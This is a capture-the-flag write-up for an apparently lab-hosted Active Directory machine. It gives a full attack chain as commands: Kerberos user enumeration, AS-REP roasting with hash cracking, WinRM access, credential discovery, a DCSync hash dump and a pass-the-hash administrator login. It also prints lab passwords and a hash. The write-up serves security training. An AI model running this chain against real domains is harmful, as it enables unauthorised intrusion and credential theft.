Difficulty: Easy
### Information Gathering

IP Address: 10.129.95.180

# User Flag
#### Service Enumeration

NMAP Enumeration through the ports.
```
sudo nmap 10.129.95.180
```

```
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

For more details.
```
sudo nmap 10.129.95.180 -sC -sV 
```

On the website "About" section, there is a list of users of the company.
![](<Screenshot 2026-07-28 at 04.15.27.png>)

A new word list with those users with variations have been made.
```
Fergus.Smith
F.Smith
fsmith
Hugo.Bear
H.Bear
hbear
Steven.Kerb
S.Kerb
skerb
Shaun.Coins
S.Coins
scoins
Bowie.Taylor
B.Taylor
btaylor
Sophie.Driver
S.Driver
sdriver
```

Kerberos bruteforcing is attempted to find valid users.
```
kerbrute userenum --dc 10.129.95.180 -d egotistical-bank.local users.txt
```

A hash is actually thrown for the user `fsmith`.

This command will generate the hash for the hashcat format.
```
impacket-GetNPUsers 'egotistical-bank.local/' -dc-ip 10.129.95.180 -format hashcat -usersfile users.txt
```

This hash will be cracked in `hashcat`.
```
hashcat -m 18200 hash.txt rockyou.txt
```

The password is `Thestrokes23`

```
netexec smb egotistical-bank.local -u 'fsmith' -p 'Thestrokes23' --shares
```

A connection to WinRM is attempted.
```
evil-winrm -i egotistical-bank.local -u 'fsmith' -p 'Thestrokes23'
```

The user flag has been successfully obtained.
![](<Screenshot 2026-07-28 at 04.39.47.png>)

# Root Flag
#### Privilege Escalation

Bloodhound enumeration is performed.
```
bloodhound-ce-python -u 'fsmith' -p 'Thestrokes23' -ns 10.129.95.180 -d egotistical-bank.local -c All --zip
```

After uploading `winpeas.exe` on the target and running it, basic credentials were found on the system.

`svc_loanmanager:Moneymakestheworldgoround!`

After checking the privileges for both `fsmith` and `svc_loanmanager`, the latter has DCSync privileges to the domain.

![](<Screenshot 2026-07-28 at 04.47.52.png>)

This command is used to dump the hashes.
```
impacket-secretsdump egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.95.180
```

The `administrator` hash has been successfully returned.

The WinRM session is now initiated.
```
evil-winrm -i egotistical-bank.local -u 'administrator' -H '823452073d75b9d1cf70ebdf86c7f98e'
```

The root flag has been successfully obtained.
![](<Screenshot 2026-07-28 at 04.52.25.png>)